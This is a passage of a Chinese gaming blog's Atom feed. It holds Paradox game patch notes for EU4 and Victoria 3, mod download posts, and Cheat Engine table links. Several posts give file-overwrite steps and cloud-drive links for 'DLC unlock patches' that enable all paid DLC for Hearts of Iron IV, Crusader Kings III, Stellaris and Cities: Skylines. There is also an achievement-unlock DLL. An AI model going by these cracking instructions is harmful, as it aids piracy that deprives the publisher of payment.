天，期间访问不需要梯子。这意味着你在手机上也可随意使用。</li><li>这个页面上还包含一个共享账号的链接，没有账号的可以点进去体验一下。</li></ul><p><strong>其他说明</strong></p><ul><li>开源项目可以魔改，但请保留原作者信息。确需去除，请联系作者，以免失去技术支持。</li><li>项目是站在其他巨人的肩膀上，感谢！</li><li>报错、BUG之类的提出Issue，我会修复。</li><li>因为之后ChatGPT的API变动，我可能不会跟进修复。</li><li>喜欢的可以给颗星，都是老朋友了。</li><li>不影响PHP是世界上最好的编程语言！</li></ul><p><strong>原帖地址：</strong><a href="https://github.com/pengzhile/pandora">GitHub - pengzhile&#x2F;pandora: 潘多拉，一个让你呼吸顺畅的ChatGPT。Pandora, a ChatGPT that helps you breathe smoothly.</a></p><p><strong>好了，这就是本次分享的网站了，作者以后还会分享各种干货网站。</strong></p><p><strong>希望大家支持一下。</strong></p><p><strong>感谢你的访问！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Europa Universalis IV: Patch 1.35.6 is Now Live! - Checksum [1ede] - NOT FOR PROBLEM REPORTS!</title>
      <link href="/2213.html"/>
      <url>/2213.html</url>
      
        <content type="html"><![CDATA[<p>Greetings one and all!</p><p>Today we released a hotfix patch to address some crashes that’s been annoying us all for a while.</p><p>There shouldn’t be any issues with 1.35.5 save files although we can never guarantee it.</p><p>As always, please report any issues in our <a href="https://steamcommunity.com/linkfilter/?url=https://forum.paradoxplaza.com/forum/index.php?forums/euiv-bug-reports.813/">bug report forum</a> or submit a <a href="https://steamcommunity.com/linkfilter/?url=https://support.paradoxplaza.com/">support ticket</a>. Thank you!</p><p>###################<br># Bugfixes<br>###################<br>- Fixed CTD related to region effect filtering out all provinces due to triggers.<br>- Fixed CTD related to having trade centers as tributaries.<br>- Fixed CTD fix related to the zone of control tooltips.<br>- Fixed CTD related to tool tipping a subunit that doesn’t belong to a unit.<br>- Fixed CTD when missing to specify a modifier for opinion effect.<br>- Fixed CTD related to removing countries from the war which would invalidate paths due to forts blocking.<br>- Fixed CTD related to declaring war and subjects not having a subject type.</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 日志 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汉化】Denmark Overhaul 丹麦拓展</title>
      <link href="/e368b756.html"/>
      <url>/e368b756.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/07/image.png"></p><p>已适配官方中文</p><p>简介<br>社会民主党在丹麦处于优势地位，最近以“斯陶宁或混乱”的口号赢得了选举。<br>由于人力有限，民众希望避免战争；而在边境之外，德国的战争机器正在为了更大野心而轰鸣着。丹麦能经受住时间的考验吗？还是它的民主会受到欧洲各地日益高涨的极端主义践踏？</p><p>特色<br>包括210多个国策的丹麦独特国策树<br>12项成就（详见职业生涯）<br>150多项事件<br>丹麦的新胜利点</p><p>详细内容</p><p>丹麦国策树<br>民主主义-历史：尽量避免激怒德国人和英国人，同时保护丹麦人的生活方式免受外国影响。<br>民主主义-架空：尽早采取适当行动反对法西斯主义，与同盟国或北欧国家结盟，为即将到来的冲突做好准备。<br>共产主义：利用地下运动组织革命，随后决定是应该走自己的共产主义道路还是跟随莫斯科的领导之前。<br>法西斯主义：组织丹麦的法西斯主义政党，努力加强你在世界上的地位，或者服从德意志国，并利用他们在北方占据更强大的地位。<br>君主主义：让国王掌权，像以前那样领导丹麦，要么恢复丹麦昔日的辉煌，要么与德皇结盟。</p><p>创意工坊</p><p><a href="https://steamcommunity.com/sharedfiles/filedetails/?id=2998815449">下载</a></p><p>提取码:3puu</p><p>百度网盘</p><p><a href="https://pan.baidu.com/s/1-n1V6u-IvCAIF_4I3IfbQQ">下载</a></p><p>提取码:3puu</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> mod </tag>
            
            <tag> 钢铁雄心4 </tag>
            
            <tag> HOI4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crusader Kings III 王国风云 3 CT 作弊表 更新至 v1.9.2</title>
      <link href="/d8f89765.html"/>
      <url>/d8f89765.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>- v1.9.2</p><p><strong>使用方法：</strong><br>- 下载安装 <a href="https://pan.quark.cn/s/10e10bc30ffd">Cheat Engine</a><br>- 在 Cheat Engine 中打开对应版本 CT 表，选择游戏的正在运行进程<br>- 保存作弊表<br>- 选择对应选项即可激活相关功能</p><p><a href="https://pan.quark.cn/s/1dc74f9219db">网盘-a</a><br><a href="https://pan.quark.cn/s/93468a7b6534">网盘-b</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CK3 </tag>
            
            <tag> CT </tag>
            
            <tag> 王国风云3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Europa Universalis IV 欧陆风云 4 CT 作弊表 更新至 v1.35.4.0</title>
      <link href="/a72ef5da.html"/>
      <url>/a72ef5da.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>- v1.35.4.0</p><p><strong>使用方法：</strong><br>- 下载安装 <a href="https://pan.quark.cn/s/10e10bc30ffd">Cheat Engine</a><br>- 在 Cheat Engine 中打开对应版本 CT 表，选择游戏的正在运行进程<br>- 保存作弊表<br>- 选择对应选项即可激活相关功能</p><p><a href="https://pan.quark.cn/s/1dc74f9219db">夸克网盘</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> CT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hearts of Iron IV 钢铁雄心 4 DLC文件 &amp; 解锁补丁 至最新 1.12.*《唯有浴血》</title>
      <link href="/88db93a5.html"/>
      <url>/88db93a5.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>- v1.12.* 至最新《By Blood Alone 唯有浴血》</p><p><strong>包含DLC:</strong><br>- 全部 DLC</p><p><strong>使用方法：</strong></p><p>- DLC 文件覆盖到游戏目录 `game` （一般情况下，不是跨大版本更新的话，DLC 文件都是可以通用）<br>- 解锁补丁文件覆盖游戏目录 `binaries`<br>- 备用选项：<br>  - 解锁补丁文件覆盖 `*&#x2F;Users&#x2F;用户名&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Paradox Interactive&#x2F;launcher&#x2F;` (不是必须步骤，如果游戏内不能启用 DLC 再尝试操作)</p><p><a href="https://pan.quark.cn/s/1dc74f9219db">下载地址1</a> <a href="https://pan.quark.cn/s/93468a7b6534">下载地址2</a> </p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 补丁 </tag>
            
            <tag> dlc </tag>
            
            <tag> P社 </tag>
            
            <tag> 钢铁雄心4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crusader Kings III 王国风云 3 DLC文件 &amp; 解锁补丁 至 v1.9.*《巡游和比武大会》</title>
      <link href="/b566ec3c.html"/>
      <url>/b566ec3c.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>- v1.9.* 至最新《Tours &amp; Tournaments 巡游和比武大会》</p><p><strong>包含DLC:</strong><br>1296730 &#x3D; Crusader Kings III: Garments of the Holy Roman Empire<br>1296731 &#x3D; Crusader Kings III: Fashion of the Abbasid Court<br>1303182 &#x3D; Crusader Kings III: Royal Court<br>1303183 &#x3D; Crusader Kings III: Northern Lords<br>1303184 &#x3D; Crusader Kings III: Fate of Iberia<br>2114760 &#x3D; Crusader Kings III: Friends &amp; Foes<br>1359040 &#x3D; Crusader Kings III: Expansion Pass<br>2311930 &#x3D; Crusader Kings III: Elegance of the Empire<br>2311920 &#x3D; Crusader Kings III: Tours &amp; Tournaments</p><p><strong>使用方法：</strong></p><p>- DLC 文件覆盖到游戏目录 `game` （一般情况下，不是跨大版本更新的话，DLC 文件都是可以通用）<br>- 解锁补丁文件覆盖游戏目录 `binaries`<br>- 备用选项：<br>  - 解锁补丁文件覆盖 `*&#x2F;Users&#x2F;用户名&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Paradox Interactive&#x2F;launcher&#x2F;` (不是必须步骤，如果游戏内不能启用 DLC 再尝试操作)</p><p><a href="https://pan.quark.cn/s/1dc74f9219db">下载地址1</a> <a href="https://pan.quark.cn/s/93468a7b6534">下载地址2</a> </p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 补丁 </tag>
            
            <tag> CK3 </tag>
            
            <tag> 王国风云3 </tag>
            
            <tag> Crusader Kings III </tag>
            
            <tag> dlc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>城市天际线 补充电台DLC包 + Steam &amp; Epic 解锁补丁 v1.17.1-f4</title>
      <link href="/978d0664.html"/>
      <url>/978d0664.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>- v1.17.1-f4</p><p><strong>包含DLC:</strong></p><p>- 全部DLC</p><p><strong>使用方法：</strong></p><p>- 本体已包含DLC文件<br>- 补充电台 DLC 包解压到游戏目录相同文件夹<br>- 解锁补丁文件直接覆盖游戏相应目录即可</p><p><strong>下载：</strong></p><p>夸克网盘</p><p><a href="https://pan.quark.cn/s/1dc74f9219db">下载</a></p><p>备用地址</p><p><a href="https://juij.eu.org/#Paradox%20Interactive">https://juij.eu.org/#Paradox%20Interactive</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 补丁 </tag>
            
            <tag> dlc </tag>
            
            <tag> P社 </tag>
            
            <tag> 刁民 </tag>
            
            <tag> 城市天际线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stellaris 群星 DLC文件 &amp; 解锁补丁 至最新 v3.8.*《至臻完人》</title>
      <link href="/9683c041.html"/>
      <url>/9683c041.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>- v3.8.* 至最新《Galactic Paragons 至臻完人》</p><p><strong>包含DLC:</strong><br>- 全部 DLC</p><p><strong>使用方法：</strong></p><p>- DLC 文件覆盖到游戏目录 `game` （一般情况下，不是跨大版本更新的话，DLC 文件都是可以通用）<br>- 解锁补丁文件覆盖游戏目录 `binaries`<br>- 备用选项：<br>  - 解锁补丁文件覆盖 `*&#x2F;Users&#x2F;用户名&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Paradox Interactive&#x2F;launcher&#x2F;` (不是必须步骤，如果游戏内不能启用 DLC 再尝试操作)</p><p><a href="https://pan.quark.cn/s/1dc74f9219db">下载地址1</a> <a href="https://pan.quark.cn/s/93468a7b6534">下载地址2</a> </p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 补丁 </tag>
            
            <tag> dlc </tag>
            
            <tag> Stellaris </tag>
            
            <tag> 群星 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【补丁】使用mod时成就解锁、1.35.3可用</title>
      <link href="/4962d6e3.html"/>
      <url>/4962d6e3.html</url>
      
        <content type="html"><![CDATA[<p>这个补丁需要和双字节补丁的version.dll共同使用才生效</p><p>注意：请将该补丁放在游戏根目录下的plugins文件夹中（即双字节补丁plugin64.dll同目录）</p><p>理论上p社不改成就检测代码的话、这个应该可以一直用</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/06/image.png"></p><p><a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/06/09/1_20230609145323_dll_main.zip">下载地址</a><br>需要跟双子节一起使用</p><p><a href="https://blog.gjcloak.top/1591.html">双子节链接</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 成就 </tag>
            
            <tag> 补丁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【EU4】1.35.x版旧地图mod 2023.04.18</title>
      <link href="/d0da8edf.html"/>
      <url>/d0da8edf.html</url>
      
        <content type="html"><![CDATA[<p>=&#x3D;1.35.x版&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>由于1.35.* 仍然能使用.就不再修改了…</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-45-1024x789.png"></p><p>1.35.x版旧地图mod</p><p><a href="https://pan.baidu.com/s/1zm9gnPAEtw483Xiv7FP14A">下载</a></p><p>提取码:hd1a</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> mod </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【1.35更新】欧陆风云4 殖民地拓展东亚(大明)特供版</title>
      <link href="/2b3ed5c5.html"/>
      <url>/2b3ed5c5.html</url>
      
        <content type="html"><![CDATA[<p>新版本还挺有意思，翻出来更新了下。随机更新，有爱自取，欢迎魔改</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-39-1024x576.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-40-1024x826.png"></p><p>东亚独立为一个大洲，方便东亚国家（大明）殖民，同时假如是玩大明的话几个殖民地改成了专属名称。补充一下（这个挺多人问的），欧洲国家也可以成立全部殖民地政府，其他大洲国家可以成立除本洲外的殖民地政府，还有，殖民政府成立之前不要与本土相连，先割飞地或者用附庸国隔开，不然会默认为本土不会成立殖民地政府</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-41-1024x379.png"></p><p>中国自古同化能力那么强，同化机制必须安排上</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-42-1024x576.png"></p><p>印度历史上就完全沦为了殖民地，怎么能只开贸易公司呢</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-43-1024x576.png"></p><p>烂地安排个殖民地政府方便一点吧</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-44-1024x576.png"></p><p>其实新版西非殖民地跟埃塞俄比亚殖民地细分出了两个殖民地，懒得截图了</p><p><a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/05/26/1_20230526080246_%E6%AE%96%E6%B0%91%E5%9C%B0%E6%8B%93%E5%B1%95%EF%BC%88%E5%A4%A7%E6%98%8E%E7%89%B9%E4%BE%9B%E7%89%88%EF%BC%891.35.zip">下载地址</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 分享 </tag>
            
            <tag> mod </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Victoria 3: Update 1.3 is now Live!</title>
      <link href="/1971.html"/>
      <url>/1971.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-29-1024x133.png"></p><h2 id="1-3-版更新的主要功能"><a href="#1-3-版更新的主要功能" class="headerlink" title="1.3 版更新的主要功能"></a>1.3 版更新的主要功能</h2><p>● 开创或促进政治运动的鼓动者角色 (新职责)<br>● 可邀请被其他国家流放的鼓动者<br>● 新的“角色互动”系统，添加与您国家中的角色直接互动的能力 (模组作者可扩充脚本)<br>● 角色互动：流放角色、送返流亡者、王室联姻<br>● 翻新立法机制，在通过法律之前要经过三个阶段<br>● 翻新革命进展机制，添加大量全新革命事件<br>● 全面翻新政治概览面板，可更轻松地概览您的忠诚和激进利益集团，以及其他增强<br>● 全新政治运动面板为您提供支持性利益集团、鼓动者和人群的明细<br>● 全新革命地图标记和视觉效果<br>● 全新法律组：土地改革<br>● 全新教会与国家法律：国家无神论<br>● 全新权力分配法律：一党制国家、技术治国<br>● 全新经济体制法律：工业禁令<br>● “请愿”日志条目可让政府中的利益集团鼓励通过他们想要的法律<br>● 翻新法国、阿尔及尔、非洲部分地区和德国的国家边界<br>● 8 项新成就</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-30-1024x133.png"></p><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><p>● 添加“支持的法律被取消”修正，如果一场政治运动被安抚后，其立法被取消，该运动会激进化。<br>● 现在政治运动没有利益集团的支持不会再变为革命<br>● 添加国家权威值为负数时生活水平变化中会产生更多激进派的效果<br>● 在奥斯曼帝国、墨西哥、新格拉纳达和范·迪门的土地添加鸦片种植潜力<br>● 如果角色的文化沉迷于鸦片，则该角色更有可能鸦片成瘾<br>● 被解放的非裔美利坚&#x2F;加勒比海&#x2F;巴西等国家，现在有新事件确保奴隶制在其国家几乎必定会废除<br>● 在摩洛哥和撒哈拉添加煤炭和黄金潜力，以反应史实中的煤田和银田<br>● 根据历史上的捕捞数据，对世界各地的某几个地区添加捕鲸站潜力<br>● 现金储备低、就业率 10% 以上且利润低的建筑现在将避免雇用更多员工，因为这通常会导致这些员工在几周后就被解雇<br>● 利益集团的女性领袖现在仅会在妇女选举权通过后出现 (除非她们是通过特殊内容产生的，例如争取上述选举权)，以更好地反映历史上女性在政治方面权利遭剥夺的情况<br>● 调整各法律组的基本施行时间以匹配新的三阶段施行系统<br>● 在数据库中补充历史上的斯堪的纳维亚利益集团领袖、舰队司令和陆军将领<br>● 更新海地和多米尼加的人口数量和文化，以更好地反映 1836 年的情况<br>● 更新比利时和尼德兰的人口数量，使其更符合史实<br>● 黑山已进一步缩小，以更好地反映 1836 年的边界<br>● 俄罗斯陆军将领现在有明确的意识形态和利益集团<br>● 更新日本、萨哈林和台湾的城市中心名称和位置，使其更符合史实<br>● 修正尼日尔河下游和莫桑比克周围的起始设置<br>● 自动扩建建筑将不再评估建造队列的长度，而是只检查现金储备和市场接入度是否高于 95%</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-31-1024x133.png"></p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><p>● 修正一些预算盈余较高的 AI 不会建造高优先级政府建筑 (如建造部门) 的错误<br>● AI (和自主投资) 现在更不愿意在没有基础设施支持的地区过度建设<br>● AI (和自主投资) 将不再继续在拥有完全市场接入度但没有劳动力支持新建筑的地区建造铁路建筑<br>● AI 现在更擅长优先考虑大学和创新力产出，尤其是在使用更先进的大学生产方式方面<br>● AI 现在更倾向于将“归还地区”战争目标变成主要战争目标，特别是在其试图完成日志条目的情况下<br>● 修正 AI 会反复宣告而后又打破宿敌关系的问题<br>● AI 现在较不会在没有充分理由的情况下占领条约港<br>● AI 现在如果没有和解态度，会较热衷于回敬外国的宿敌宣告<br>● 和平评估 AI 不再将已执行的战争目标视为错失的机会</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-32-1024x133.png"></p><h2 id="平衡"><a href="#平衡" class="headerlink" title="平衡"></a>平衡</h2><p>● 大幅扩展人群何时会不顾其利益集团加入政治运动的权重<br>● 君主及其继承人现在有多种因素影响其与哪个利益集团结盟<br>● 非指挥官角色现在较不容易受伤<br>● 每周因资助背负义务的几率从 1% 降低至 0.2%<br>● 征服的地区若非同时为征服者的家乡及其宣称有权统治的地区，产生的激进派数量会增加<br>● 考迪罗主义者意识形态现在会支持总统共和制<br>● 谷物法现在要求非常昂贵的谷物价格，且会产生市场自由主义者地主鼓动者而非利益集团领导者<br>● 地主和实业家角色较有可能有昂贵嗜好<br>● 军官现在会因独裁制法律获得政治力量<br>● 角色的最大个性特质提升至 2 个，角色的最大技能特质降低至 2 个<br>● 委员会共和国现在从得票率中获得一些合法性<br>● 总统共和制现在会因在政府中有国家元首而获得合法性加成，但从得票率获得的合法性较少<br>● 在自给型建筑中工作的人群现在预期生活水平受识字率的影响大大降低<br>● 时代 4 和 5 的科技花费降低，使得达到终局科技变得没那么困难<br>● 不列颠东印度现在开局时会拥有铁路科技<br>● 如果一个利益集团的鼓动者支持某项政治运动，则该利益集团现在将更倾向支持该政治运动<br>● 支持文化多元现在可在人道主义意识形态中找到<br>● 多种个性特质现在改为彼此不兼容<br>● 康涅狄格添加伐木篷潜力<br>● 显著降低角色随时间获得技能特质的速度，特别是当他们是流亡者或招募池中的指挥官时<br>● 更多建筑类型现在会受到危险工作条件的影响<br>● 调整虔信者利益集团的人群吸引力<br>● 穆斯林角色现在较不可能成为酗酒者<br>● 激进的意识形态不再对公民权法律有立场<br>● 印度兵变现在是普通外交博弈而非立即爆发战争<br>● 产业隔阂事件现在只针对显著的少数群体<br>● “工业安全放缓”的吞吐量修正从 50% 降低至 10%<br>● 更改赌博的条件，要求政府中有多个利益集团</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-33-1024x133.png"></p><h2 id="美术"><a href="#美术" class="headerlink" title="美术"></a>美术</h2><p>● 在游戏设置下添加一个选项，可启用替代版占领视觉效果 (条纹而非旗帜)<br>● 为空中侦察生产方式添加飞机在军事单位上空飞行的视觉效果<br>● 军事视觉效果全面翻新<br>● 儿童现在穿着适合年龄的专属衣服<br>● 君主制的继承人不再一辈子都是秃顶且未蓄胡<br>● 修正衣服重量，使儿童不会穿着穿过其身体的衣服<br>● 微调污染视觉特效<br>● 路易斯·德莱克吕兹现在被禁止戴帽子<br>● 添加加里波第的红衫作为动态士兵和军官人群服装<br>● 为美国添加游戏后期的制服版本</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-34-1024x133.png"></p><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p>● 更新法律标签页、法律组面板和法律施行概览窗口项目，添加改进过的立法系统<br>● 将相关的立法事件附加到概览窗口中的立法项目，以获得更好的可见性和反馈<br>● 将相关的革命事件附加到概览窗口中的革命政治运动项目，以获得更好的可见性和反馈<br>● 改进利益集团面板的布局<br>● 政治运动和革命添加更多内容丰富的提示信息<br>● 将激进派和效忠派图表合而为一，并确保始终显示此图表而非旧图表<br>● 翻新立法弹出窗口，使其现在真正可读<br>● 将立法记录点的结果添加到因此生成的立法事件中，以便更好地反馈发生的事情<br>● 为地区内有多个建筑正在积极扩建的情况添加地区建设总览地图标记，以减少覆盖地图的建设地图标记数量<br>● 对整个修正数据库进行排序，使整个游戏中的提示信息更易读<br>● 在利益集团本身及其提示信息上添加其支持的政治运动的更多信息<br>● 将地区的城镇化值添加到地区提示信息和城镇中心建筑提示信息中<br>● 对警告和当前形势项目进行多项更改和调整，以减少滥发并提供更多信息，包括禁用一些通知并将其信息移动到整个用户界面中更合适的位置<br>● 添加将您之前隐藏的所有重要行动取消隐藏的功能<br>● 添加在当前形势窗口中“隐藏”重要行动的按钮<br>● 为政治冷漠和总支持数改进人群支持提示信息<br>● 改进改革政府建议的选项按钮，使当前选择的选项更清楚<br>● 现在可在日志条目面板底部查看该日志条目时间耗尽时可能发生的结果 (若有可能的话)<br>● 日志条目完成和失败效果添加背景颜色<br>● 添加新的游戏概念“中立”以更好地解释效忠派&#x2F;激进派的中间地带<br>● 将政治冷漠改名为政治无党派以更好地描述其含义<br>● 修正在观察者模式下保存的进度在启动器中看起来损坏的问题<br>● 修正无条件和平按钮总是显示得好像 AI 不会接受一样的问题<br>● 在贸易路线列表项目中添加贸易路线大小趋势指标<br>● 解放国家战争目标现在会在地图上高亮显示正在解放的国家<br>● 角色提示信息已更新，包含鼓动者和政治运动的所有相关信息<br>● 使所有左侧面板的字幕保持一致，并在可能的情况下提供相关内容的直达按钮<br>● 将政府&#x2F;反对派立场添加到利益集团提示信息的顶部<br>● 改进研究队列的提示信息<br>● 现在所有角色都可以访问右键菜单，因为外国角色或流放池中的角色可以进行角色互动<br>● 您无法进一步扩建的建筑的地图互动现在会有挂锁状态，并且不会移至不可用选项列表<br>● 法令的地图互动现在默认按地区名称排序<br>● 外交行动的地图互动现在默认按国家名称排序<br>● 地图互动状态勾号 + 红色十字已从用户界面中移除，现在仅显示为红色十字<br>● 翻新地图互动状态，在大多数情况下防止项目从可用跳转到不可用选项<br>● 添加预期生活水平至地区生活水平提示信息<br>● 为战斗状况添加精美提示信息<br>● 为大量人群生活在预期生活水平以下的地区添加重要行动<br>● 对决议列表进行排序，将可采用的决议排在顶端<br>● 现在进一步拉远镜头时，可以看到移民目的地地图标记<br>● 减少几个修正的小数位数，使其更易读<br>● 在公民权以及教会与国家法律的提示信息顶部显示其接受度描述<br>● 在军队类型和国内安全法律提示信息的顶部显示可动员的营队数<br>● 反转意识形态提示信息中意识形态立场的顺序，先显示该意识形态赞成的法律，再显示其反对的法律<br>● 添加预期生活水平至地区生活水平提示信息<br>● 玩家现在可以把任何想要的市场固定到市场面板的概览窗口<br>● 改善宿敌行动的地图列表面板<br>● 在主菜单添加可下载内容图标，并附有启动状态和 Steam 商店链接<br>● 改善人物右键菜单<br>● “该选项将自动选择”图标移至按钮的另一侧，使其更容易进入该选项的巢状提示信息<br>● 地区特质现在会在生产视图中显示为地图标记<br>● 未兑现税务明细现在会显示在预算面板中<br>● 支持法律的利益集团现在会显示在法律提示信息的第一层<br>● 修正地图列表高亮显示内容在鼠标离开后未移除的错误<br>● GDP 图表现在会显示年度 GDP 而非每周 GDP，与顶部条显示的相匹配<br>● 现在已省略陆战&#x2F;海战初始规模提示信息中的空缺数值<br>● 修正了观察者在观察被吞并的国家时会看到游戏结束画面的问题<br>● 改善生活水平低落时的当前形势<br>● 让选举面板可处理 3 个以上政党<br>● 精简可招募指挥官的提示信息<br>● 预算面板的“黄金储备”小组件在没有黄金储备时不会再空无一物，而会显示一条空杠<br>● 移除“科技”中 (几乎) 未使用的高亮显示内容<br>● 在地图列表选项添加新背景<br>● 修正侧边栏在部分语言中太积极开启的问题</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-35-1024x133.png"></p><h2 id="叙事内容"><a href="#叙事内容" class="headerlink" title="叙事内容"></a>叙事内容</h2><p>● 法国添加新王朝意识形态：奥尔良派、正统主意派和波拿巴派<br>● 新意识形态：实证主义者、勒德主义者、社会主义者<br>● 添加人道主义、保护主义、杰克逊式民主和专制主义领袖意识形态。社会主义意识形态现在会在研究社会主义后添加到工会中<br>● 日志条目现在会由革命的胜利者继承，代表如果清政府在革命中被推翻，中国的“脆弱的统一”等日志条目不会突然终止<br>● 重大修改德国统一的相关日志条目。移除通过关税同盟吞并德意志小国的过程，日志条目改为更密切地遵循历史，从石勒苏益格-荷尔斯泰因问题开始，只有在德意志领导权战争结束后才允许吞并南北德意志小国<br>● 为虚无主义运动加入了一个日志条目和各种事件<br>● 更新并扩展了“美好年代”日志条目<br>● 虚无主义者现在会支持国家无神论<br>● 添加鲁尔地域<br>● 添加可释放国家莱茵兰<br>● 让大型博览会更有可玩性、移除不协调性，为日志条目进行期间研究的科技提供奖励<br>● 添加让鼓动者功成身退的事件<br>● 已添加通过土地所有权法律的事件<br>● 已添加通过工业禁令法律的事件<br>● 已添加一些在开始游戏时的鼓动者<br>● 已添加允许与流亡者互动的数个事件<br>● 已添加有进行中的革命时触发的事件<br>● 已添加法兰克-普罗旺斯文化<br>● 已添加额外人物特质<br>● 已降低“武装原住民”巴塔哥尼亚事件的频率，但让效果更有影响力。<br>● 为法兰克-普罗旺斯大陆添加可释放的萨伏依<br>● 亚伯·林肯只有当他的年纪足以就任总统时，才会以利益集团领袖的身份出现<br>● 瑞士的宗教已确立为新教，但也更明确划分天主教领袖<br>● “瑞士”文化已改为“阿勒曼尼”，并更改所有与瑞士文化相关的关键<br>● 法语历史人物文件已转换为仅使用人物模板<br>● 已添加如果美国由加州组成则有美国国旗<br>● 为共产主义的加利福尼亚和加利福尼亚控制下加利福尼亚的情况添加新的旗帜</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-36-1024x133.png"></p><h2 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h2><p>● 改善教程高亮显示的性能<br>● 地图粒子优化</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-37-1024x133.png"></p><h2 id="模组"><a href="#模组" class="headerlink" title="模组"></a>模组</h2><p>● 所有日志控制台命令现在都重命名以“Logging.”开头，并以标准方式记录输出<br>● 为 GUI 和本地化脚本添加 Character.IsInExilePool and Character.IsExile<br>● 已添加新效果 exile_character<br>● 已添加新效果 emove_character_role<br>● 已添加通过 home_country 查看人物祖国 (而不是他们当前的国家) 的功能<br>● 已添加新触发器 is_exile 和 is_in_exile_pool<br>● 已添加人物与支持行动的 political_movement 链接，以及其他方向的 supporting_character 链接<br>● 意识形态现在可以有一个优先数值组合，当两个非首领意识形态有相同的法律组立场时，会决定使用哪种意识形态<br>● 已添加 has_template 触发器，可用于确认人物是否是特定模版<br>● 已添加新 GUI 和本地化脚本功能以使用流亡者的祖国和利益集团类型<br>● 触发器 is_interest_group_type 现在也可用于人物查看 (对于流亡者很实用)<br>● 已添加 ai_enact_weight_modifier 在法律的脚本化权重，让 AI 的权重能直接修改来施行该法律。<br>● 已添加当一个政治运动支持的立法被取消时的 on_action<br>● 已添加 cancel_enactment 效果<br>● 